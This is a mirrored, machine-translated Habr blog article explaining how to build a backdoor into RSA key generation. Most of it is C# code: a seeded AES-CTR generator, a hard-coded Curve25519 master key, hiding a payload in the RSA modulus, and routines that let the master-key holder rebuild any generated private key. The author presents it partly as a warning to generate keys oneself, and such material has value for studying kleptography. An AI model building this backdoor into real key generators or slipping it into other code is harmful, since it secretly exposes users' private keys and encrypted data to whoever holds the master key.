<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We build a backdoor in the RSA public key</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hi% username%! 
 When I saw how it works, to say that I was in shock - to say nothing. This is a pretty simple trick, but after reading this article, ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We build a backdoor in the RSA public key</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/344/f90/68f/344f9068f4c146d28f0a2cefa8c99800.jpg" align="right"><br>  Hi% username%! <br>  When I saw how it works, to say that I was in shock - to say nothing.  This is a pretty simple trick, but after reading this article, you will never look at the RSA again.  This is not an RSA hack, this is something that will cause your paranoia to swell very much. <br><a name="habracut"></a><br><br>  So, imagine that you have access to the RSA key generator and you want to continue to give someone the opportunity to find out the private key without any factorization and other quantum computers.  What do we need for this? <br><br>  I will immediately rush to C # code that uses BouncyCastle and <a href="">Chaos.NaCl</a> (this library implements <a href="http://habrahabr.ru/post/247873/">Curve25519</a> ) 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      1) PRNG <br><br>  We need the PRNG, which is initialized with a secret value.  Will use AES s CTR mode <br><br><div class="spoiler">  <b class="spoiler_title">PRNG code</b> <div class="spoiler_text"><pre><code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> Org.BouncyCastle.Crypto.Engines; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> Org.BouncyCastle.Crypto.Parameters; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> Org.BouncyCastle.Crypto.Prng; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> Org.BouncyCastle.Security; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">RsaBackdoor.Backdoor</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">SeededGenerator</span></span>:<span class="hljs-title"><span class="hljs-title">IRandomGenerator</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> AesFastEngine _engine = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> AesFastEngine(); <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] _counter = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">16</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] _buf = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">16</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> bufOffset = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SeededGenerator</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] key</span></span></span><span class="hljs-function">)</span></span> { _engine.Init(<span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> KeyParameter(key)); MakeBytes(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">MakeBytes</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { bufOffset = <span class="hljs-number"><span class="hljs-number">0</span></span>; _engine.ProcessBlock(_counter, <span class="hljs-number"><span class="hljs-number">0</span></span>, _buf, <span class="hljs-number"><span class="hljs-number">0</span></span>); IncrementCounter(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">IncrementCounter</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; _counter.Length; i++) { _counter[i]++; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (_counter[i] != <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AddSeedMaterial</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] seed</span></span></span><span class="hljs-function">)</span></span> { } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AddSeedMaterial</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> seed</span></span></span><span class="hljs-function">)</span></span> { } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">NextBytes</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] bytes</span></span></span><span class="hljs-function">)</span></span> { NextBytes(bytes, <span class="hljs-number"><span class="hljs-number">0</span></span>, bytes.Length); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">NextBytes</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] bytes, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> start, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> count = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (count &lt; len) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> amount = Math.Min(_buf.Length - bufOffset, len - count); Array.Copy(_buf, bufOffset, bytes, start + count, amount); count += amount; bufOffset += amount; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bufOffset &gt;= _buf.Length) { MakeBytes(); } } } } }</code> </pre> <br></div></div><br><br>  2) Let us recall the wonderful <a href="http://habrahabr.ru/post/247873/">Curve25519</a> , namely the fact that any 32-byte sequence is a valid private key for it, and the public key is also always 32 bytes. <br>  Generate the master key in advance and write it somewhere in the constant. <br><br><pre> <code class="cs hljs"> <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> MY_PUBLIC_STR = <span class="hljs-string"><span class="hljs-string">"06F1A4EDF328C5E44AD32D5AA33FB7EF10B9A0FEE3AC1D3BA8E2FACD97643A43"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] MY_PUBLIC = StringToByteArray(MY_PUBLIC_STR); <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> MY_PRIVATE_STR = <span class="hljs-string"><span class="hljs-string">"BDB440EBF1A77CFA014A9CD753F3F6335B1BCDD8ABE30049F10C44243BF3B6C8"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">readonly</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] MY_PRIVATE = StringToByteArray(MY_PRIVATE_STR);</code> </pre><br><br>  For each RSA key pair that we will generate, we will also generate a random key pair Curve25519, and then read the shared secret from the private key of this pair and our public one.  This secret will be the key for our PRNG from p.1 <br><br><div class="spoiler">  <b class="spoiler_title">Generation seed for PRNG</b> <div class="spoiler_text"><pre> <code class="cs hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">MakeSeedAndPayload</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] seed, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] payload</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> rnd = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SecureRandom(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> priv = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">32</span></span>]; rnd.NextBytes(priv); payload = MontgomeryCurve25519.GetPublicKey(priv); seed = MontgomeryCurve25519.KeyExchange(MY_PUBLIC, priv); }</code> </pre><br></div></div><br><br>  The public key Curve25519, which we use to calculate the <b>seed</b> in the future, is ‚Äúpayload‚Äù or <b>payload</b> .  We will try to shove it into the RSA public key. <br><br>  3) Generate a key RSA pair using this PRNG and our <b>seed</b> . <br><br><pre> <code class="cs hljs"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> publicExponent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BigInteger(<span class="hljs-string"><span class="hljs-string">"10001"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> keygen = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RsaKeyPairGenerator(); keygen.Init(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RsaKeyGenerationParameters(publicExponent, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SecureRandom(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SeededGenerator(seed)), <span class="hljs-number"><span class="hljs-number">2048</span></span>, <span class="hljs-number"><span class="hljs-number">80</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pair = keygen.GenerateKeyPair();</code> </pre><br><br>  It is worth recalling here that the basis of RSA keys is always two primes p and q.  Their work is called "module" and is part of the public key.  In this case, with the help of our PRNG, two numbers of 2048 bits are searched for and then a key pair is constructed from them. <br><br>  4) Take the p * q module and replace some of the bytes with our payload.  Take older bytes so that they are not ground in the future.  An offset of 80 bytes should work. <br><br><pre> <code class="cs hljs"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> paramz = ((RsaPrivateCrtKeyParameters) pair.Private); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> modulus = paramz.Modulus.ToByteArray(); Replace(modulus, payload, <span class="hljs-number"><span class="hljs-number">80</span></span>); <span class="hljs-comment"><span class="hljs-comment">// 80 -  </span></span></code> </pre><br><br>  4) We now have a new module n '. We need to regenerate the remaining parameters with the new n', namely: <br><br>  4.1) Consider the new q '.  At this stage, we will have the hell with it, but it's not scary <br>  q '= n' / p <br>  4.2.) From the new q 'we are looking for a new prime number.  When we find it, the lower bits will be frayed.  But the top will remain the same.  This is what we wanted. <br><br><pre> <code class="cs hljs"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> p = paramz.P; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BigInteger(modulus); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> preQ = n.Divide(p); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> q = preQ.NextProbablePrime();</code> </pre><br><br>  After we have a new q, we consider all the parameters of the key pair, except, p, again. <br><br><pre> <code class="cs hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> AsymmetricCipherKeyPair </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ComposeKeyPair</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">BigInteger p, BigInteger q, BigInteger publicExponent</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (p.Max(q).Equals(q)) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> tmp = p; p = q; q = tmp; } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> modulus = p.Multiply(q); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> p1 = p.Subtract(BigInteger.One); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> q1 = q.Subtract(BigInteger.One); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> phi = p1.Multiply(q1); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> privateExponent = publicExponent.ModInverse(phi); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> dP = privateExponent.Remainder(p1); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> dQ = privateExponent.Remainder(q1); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> qInv = q.ModInverse(p); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> priv = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RsaPrivateCrtKeyParameters(modulus, publicExponent, privateExponent, p, q, dP, dQ, qInv); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> AsymmetricCipherKeyPair(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RsaKeyParameters(<span class="hljs-literal"><span class="hljs-literal">false</span></span>, priv.Modulus, publicExponent), priv); }</code> </pre><br><br>  And in the end we get a valid key pair, in the public key of which our Payload disappeared - namely, information on how to get a seed, and then the coveted private key. <br><br>  We can extract payload <br><br><pre> <code class="cs hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">byte</span></span></span><span class="hljs-function">[] </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ExtractPayload</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">RsaKeyParameters pub</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> modulus = pub.Modulus.ToByteArray(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> payload = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">32</span></span>]; Array.Copy(modulus, <span class="hljs-number"><span class="hljs-number">80</span></span>, payload, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> payload; }</code> </pre><br><br>  Calculate the seed and run the process again to get the private key <br><br><pre> <code class="cs hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> AsymmetricCipherKeyPair </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BuildKeyFromPayload</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">byte</span></span></span></span><span class="hljs-function"><span class="hljs-params">[] payload</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> seed = MontgomeryCurve25519.KeyExchange(payload, MY_PRIVATE); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> BuildKey(seed, payload); }</code> </pre><br><br>  Thus, only we, owning the private key urve25519, can calculate the private key of any RSA key we have forgotten. <br><br>  Where can this be applied?  Yes, anywhere.  You will never prove that there are no such bookmarks in the key pairs issued by banks and other sources uncontrolled by you.  <b>To determine the presence of such a bookmark is impossible!</b>  So try to generate them yourself with software that knows how it works. <br><br>  Sorts for playing <a href="">here</a> <br><br>  <b>Upd:</b> <br><br>  Corrected the code, now, honestly, our public key is needed for the implementation, and we extract the seed using the private </div><p>Source: <a href="https://habr.com/ru/post/248269/">https://habr.com/ru/post/248269/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../248255/index.html">‚ÄúLove and Hate‚Äù on the map of Russia, winter 2014-2015: fourth study of the emotional state of 35 million social media users</a></li>
<li><a href="../248257/index.html">Categories big and small</a></li>
<li><a href="../248261/index.html">Right now there is a live broadcast of the seminar: ‚ÄúAdministration of the Data Domain system‚Äù</a></li>
<li><a href="../248263/index.html">Quick voice dialing on Asterisk</a></li>
<li><a href="../248267/index.html">Equivalent transformations of Maxwell equations</a></li>
<li><a href="../248271/index.html">Electronic signature on Russian regulations: practical use in enterprises</a></li>
<li><a href="../248273/index.html">Unity UI in version 4.6</a></li>
<li><a href="../248279/index.html">Practice "Intel IoT". Galileo Gen2 - First dating</a></li>
<li><a href="../248281/index.html">Zoho CRM. Overview</a></li>
<li><a href="../248283/index.html">Introduction to the development of web-applications on PSGI / Plack. Part 3. Starman</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>